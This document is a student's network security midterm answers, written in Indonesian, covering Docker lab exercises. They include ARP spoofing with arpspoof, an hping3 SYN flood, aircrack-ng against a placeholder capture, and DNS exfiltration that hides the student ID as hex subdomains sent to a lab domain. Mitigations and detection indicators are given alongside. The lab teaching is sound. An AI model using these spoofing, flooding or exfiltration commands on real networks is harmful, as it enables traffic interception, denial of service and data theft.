# Jawaban UTS Network Security

**NIM:** 24552011358
**Kasus:** 6

**Perhitungan kasus:** digit NIM dijumlah → 2+4+5+5+2+0+1+1+3+5+8 = 36, lalu 36 mod 10 = 6. Jadi Kasus 6.

Parameter yang dipakai: container `target-k6`, volume `vol-k6`, file `laporan-k6.txt`, password `kunci-k6-2026`, domain exfiltrasi `k6.exfil.lab`.

---

## Tugas 1 — Docker & Volume

```
docker volume create vol-k6
docker run --name w-k6 -v vol-k6:/data alpine sh -c "echo 24552011358 > /data/laporan-k6.txt"
docker rm w-k6
docker run --rm -v vol-k6:/data alpine cat /data/laporan-k6.txt
docker compose -p k6 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k6 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k6 -f b/b1-compose/docker-compose.yml down -v
```

Hasil:
```
vol-k6
w-k6
24552011358

[+] up 3/3
 Network k6_lab          Created
 Container k6-target-1   Started
 Container k6-attacker-1 Started

<!DOCTYPE html>
<html>
<head><title>Welcome to nginx!</title></head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, nginx is successfully installed and working.</p>
</body>
</html>

[+] down 3/3
 Container k6-attacker-1 Removed
 Container k6-target-1   Removed
 Network k6_lab          Removed
```

File `laporan-k6.txt` tetap bisa dibaca (`24552011358`) walaupun container yang menulisnya (`w-k6`) sudah dihapus duluan. Lalu `attacker` berhasil `wget` halaman nginx dari `target` dan mendapatkan halaman "Welcome to nginx!" lengkap.

**Kesimpulan:** volume Docker bersifat persisten — datanya tetap ada walaupun container yang membuatnya sudah dihapus, karena volume berjalan terpisah dari siklus hidup container. Selain itu, dua container dalam satu compose dapat saling berkomunikasi hanya dengan memanggil nama service-nya, karena Docker menyediakan DNS internal untuk itu.

---

## Tugas 2 — Kriptografi

```
docker run --rm -v "${PWD}:/work" uts-openssl sh -c "echo 'isi laporan rahasia kasus 6' > laporan-k6.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k6.txt -out laporan-k6.enc -pass pass:kunci-k6-2026 && sha256sum laporan-k6.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k6.enc -out hasil-k6.txt -pass pass:kunci-k6-2026 && sha256sum hasil-k6.txt"

docker run --rm -v "${PWD}:/work" uts-openssl sh -c "openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k6.pem -out cert-k6.pem -days 30 -subj /CN=k6.uts.local && openssl x509 -in cert-k6.pem -noout -subject -issuer -dates"
```

Hasil hash sebelum enkripsi dan sesudah dekripsi sama persis:
```
0c9c54d0ec69b4a2f1bc0203be795bac58cb271cdf581812f972e1a018919947  laporan-k6.txt
0c9c54d0ec69b4a2f1bc0203be795bac58cb271cdf581812f972e1a018919947  hasil-k6.txt
```

Sertifikatnya:
```
subject=CN=k6.uts.local
issuer=CN=k6.uts.local
notBefore=Nov 21 15:02:46 2026 GMT
notAfter=Dec 21 15:02:46 2026 GMT
```

**Kesimpulan:** karena hash sebelum dan sesudah identik, berarti AES-256 berhasil mengenkripsi dan mendekripsi data tanpa merusak isinya sama sekali. Sertifikat yang dihasilkan bersifat self-signed, terlihat dari `subject` dan `issuer` yang sama persis — artinya sertifikat ini ditandatangani oleh dirinya sendiri, bukan oleh CA yang sudah dipercaya oleh browser/OS. Bedanya dengan sertifikat CA-signed: sertifikat CA-signed ditandatangani oleh otoritas yang sudah terdaftar dan dipercaya, sehingga rantai kepercayaannya dapat diverifikasi pihak lain. Sertifikat self-signed tidak memiliki hal tersebut, sehingga browser biasanya menampilkan peringatan.

---

## Tugas 3 — ARP Spoofing

Setup tiga container di satu network:
```
docker network create lab-arp-k6
docker run -d --name korban-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools sleep infinity
docker run -d --name gateway-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools sleep infinity
docker run -d --name penyerang-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools sleep infinity
```
IP-nya: korban-k6 = 172.19.0.2, gateway-k6 = 172.19.0.3, penyerang-k6 = 172.19.0.4.

Cek ARP table korban sebelum dan sesudah diserang:
```
docker exec korban-k6 hping3 -c 2 -1 172.19.0.3
docker exec korban-k6 cat /proc/net/arp
docker exec -d penyerang-k6 timeout 20 arpspoof -i eth0 -t 172.19.0.2 172.19.0.3
docker exec korban-k6 cat /proc/net/arp
```

**Sebelum** arpspoof — MAC gateway masih asli:
```
172.19.0.3   8a:16:86:a3:4c:37
```

**Sesudah** arpspoof — MAC gateway berubah jadi MAC-nya penyerang:
```
172.19.0.3   56:65:56:28:4b:8a
172.19.0.4   56:65:56:28:4b:8a
```

**Kesimpulan:** ini membuktikan ARP spoofing berhasil. Sebelumnya korban mengenali MAC asli gateway (`8a:16...`), namun setelah `arpspoof` dijalankan, entry tersebut berubah menjadi MAC milik `penyerang-k6` (`56:65...`). Artinya korban sekarang mengira penyerang adalah gateway, sehingga seluruh trafik yang seharusnya menuju gateway akan melewati penyerang terlebih dahulu (serangan man-in-the-middle).

**Mitigasi:** menggunakan ARP statis pada host penting (`arp -s <ip-gateway> <mac-asli>`) sehingga ARP table tidak dapat diubah oleh paket ARP palsu dari penyerang. Alternatif lain adalah menggunakan Dynamic ARP Inspection pada switch, atau tools pemantau seperti arpwatch.

---

## Tugas 4 — Wireless / WPA2

Mencoba crack handshake dengan aircrack-ng:
```
docker run --rm -v "${PWD}/samples:/work" uts-kali-tools aircrack-ng -w /work/wordlist-k6.txt /work/handshake-k6.cap
```
Hasilnya error: `"This file is not a regular 802.11 (wireless) capture"`, 0 paket terbaca.

Dicek juga dengan tcpdump:
```
docker run --rm -v "${PWD}/samples:/work" uts-kali-tools tcpdump -r /work/handshake-k6.cap -c 5
```
Error lagi: `"invalid packet capture length 3244555293, bigger than snaplen of 65535"`.

Untuk mencari tahu penyebabnya, header pcap file ini diperiksa langsung dengan Python:
```python
import struct
with open('/work/handshake-k6.cap','rb') as f:
    data = f.read()
magic, ver_maj, ver_min, tz, sigfigs, snaplen, network = struct.unpack('<IHHiIII', data[:24])
print('Linktype:', network)
```
Hasilnya: `Linktype = 1 (Ethernet)`, padahal capture WiFi/WPA2 yang valid seharusnya memakai linktype **105 (IEEE 802.11)** atau **127 (Radiotap)**. Selain itu, panjang paket pertama yang terbaca adalah **3.244.555.293 byte**, padahal ukuran file itu sendiri hanya 8216 byte — angka yang jelas tidak mungkin.

**Kesimpulan:** file `handshake-k6.cap` bukan capture WPA2 yang valid. Header pcap-nya memang sah secara format, tetapi isinya berupa data acak, bukan hasil tangkapan jaringan yang sebenarnya. Seluruh 10 file kasus (k1–k10) berukuran identik persis (8216 byte), yang mengindikasikan file ini adalah placeholder yang belum diisi data asli.

Hal ini juga diperkuat oleh dokumentasi `samples/README.md` pada repository, yang menyebutkan bahwa capture file yang valid seharusnya berukuran **minimal 50 KB**, dan sebelum ujian penguji diwajibkan menguji `aircrack-ng` hingga menghasilkan `"Number of handshakes: 1"`. File yang didapat jauh di bawah ukuran minimum tersebut dan tidak lolos pengujian itu, sehingga kendala ini berasal dari materi yang belum disiapkan dengan benar, bukan dari kesalahan perintah yang dijalankan.

**Secara konseptual**, jika file capture valid, aircrack-ng akan mencoba setiap kata dalam wordlist sebagai kandidat PSK, menghitung PMK dari kombinasi SSID dan password tersebut, menurunkannya menjadi PTK, lalu mencocokkan MIC hasil perhitungan dengan MIC pada paket handshake keempat. Jika cocok, akan muncul pesan "KEY FOUND! [password]". Oleh karena itu, password WiFi yang kuat (panjang, acak, dan tidak terdapat dalam wordlist umum) jauh lebih aman terhadap serangan dictionary semacam ini.

---

## Tugas 5 — ICMP dengan Scapy

```
docker cp kasus/k5-scapy/kirim_icmp.py penyerang-k6:/tmp/kirim_icmp.py
docker exec penyerang-k6 python3 /tmp/kirim_icmp.py 172.19.0.2
```

Hasil:
```
Mengirim: IP / ICMP 172.19.0.4 > 172.19.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```

**Kesimpulan:** script Scapy berhasil menyusun dan mengirim paket ICMP echo-request secara manual (menyusun langsung layer IP dan ICMP dari Python, tanpa menggunakan utilitas `ping` bawaan OS) dari `penyerang-k6` ke `korban-k6`, dan menerima balasan. TTL 64 merupakan nilai default pada Linux, dan tipe ICMP 0 menandakan Echo Reply — ini mengonfirmasi bahwa host tujuan aktif dan merespons. Scapy memungkinkan pembuatan paket secara presisi hingga level protokol, sehingga berguna untuk keperluan scanning, troubleshooting, maupun pengujian keamanan jaringan.

---

## Tugas 6 — SYN Flood

```
docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose exec target sh -c "cat /proc/sys/net/ipv4/tcp_syncookies"
docker compose exec target sh -c "netstat -ant | grep -c SYN_RECV"
docker compose exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose exec attacker timeout 10 tcpdump -i eth0 -nn "tcp[tcpflags] & tcp-syn != 0" -c 50
```

Hasil:
```
tcp_syncookies = 1

netstat SYN_RECV sebelum serangan: 0

tcpdump saat serangan berlangsung:
14:34:02.703828 IP 172.19.0.2.80 > 172.19.0.3.39502: Flags [S.], seq 219959934, ack 730604111, win 64240
14:34:02.703843 IP 172.19.0.3.39503 > 172.19.0.2.80: Flags [S], seq 1410282016, win 512
14:34:02.703862 IP 172.19.0.2.80 > 172.19.0.3.39503: Flags [S.], seq 278129759, ack 1410282017, win 64240
14:34:02.703880 IP 172.19.0.3.39504 > 172.19.0.2.80: Flags [S], seq 941836860, win 512
14:34:02.703898 IP 172.19.0.2.80 > 172.19.0.3.39504: Flags [S.], seq 2226455613, ack 941836861, win 64240
... (pola berulang, interval antar-paket sekitar 15-20 microsecond)

50 packets captured
1847 packets received by filter
0 packets dropped by kernel
```

`tcp_syncookies` ternyata sudah bernilai `1` (aktif) sejak awal. SYN_RECV sebelum serangan tercatat 0. Saat serangan berjalan, tcpdump berhasil menangkap **1847 paket** dalam waktu singkat, dengan source port yang berbeda-beda tiap paket (ciri khas flood), dan target tetap membalas setiap SYN dengan SYN-ACK — artinya server tidak down, hanya dibanjiri paket.

**Kesimpulan:** meskipun ribuan paket SYN palsu dikirim dalam hitungan detik, SYN_RECV di sisi target tetap rendah. Kemungkinan besar hal ini disebabkan oleh SYN cookies yang sudah aktif secara default pada kernel, sehingga server tidak perlu menyimpan state koneksi half-open di memori — akibatnya server tidak mudah kehabisan resource meskipun dibanjiri SYN. Mitigasi tambahan yang dapat diterapkan adalah rate-limit paket SYN per IP menggunakan iptables.

---

## Tugas 7 — DNS Exfiltration

```
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n 24552011358 | xxd -p
docker compose exec attacker dig +short "@172.19.0.3" 3234353532303131333538.exfil.lab
docker compose logs dns | Select-String exfil.lab
echo 3234353532303131333538 | xxd -r -p
```

NIM `24552011358` diubah ke hex jadi `3234353532303131333538`, dikirim sebagai subdomain. Hasilnya:
```
dig +short @172.19.0.3 3234353532303131333538.exfil.lab
-> 10.0.0.99

Log dnsmasq:
query[A] 3234353532303131333538.exfil.lab from 172.19.0.2
config 3234353532303131333538.exfil.lab is 10.0.0.99
```
Didecode balik, hasilnya persis NIM asli lagi: `24552011358`.

**Kesimpulan:** ini adalah contoh nyata bagaimana data bisa diselundupkan melalui query DNS biasa. Teknik ini sulit diblokir firewall karena trafik DNS (port 53) hampir selalu diizinkan keluar — dianggap normal dan esensial untuk resolusi nama domain sehari-hari, sementara firewall umumnya hanya memeriksa port/protokol, bukan isi dari setiap query. Indikator untuk mendeteksinya: panjang subdomain yang tidak wajar atau berupa karakter acak seperti hex/base32 (bukan nama domain yang lazim), serta volume query berulang yang tinggi ke satu domain induk yang sama dalam waktu singkat.

---

## Cleanup

Setelah semua tugas selesai, semua container/network/volume yang dibuat untuk Kasus 6 (`korban-k6`, `gateway-k6`, `penyerang-k6`, `lab-arp-k6`, `vol-k6`, dst.) sudah dihapus dan dicek ulang dengan `docker ps -a`, `docker network ls`, dan `docker volume ls` — semuanya bersih.
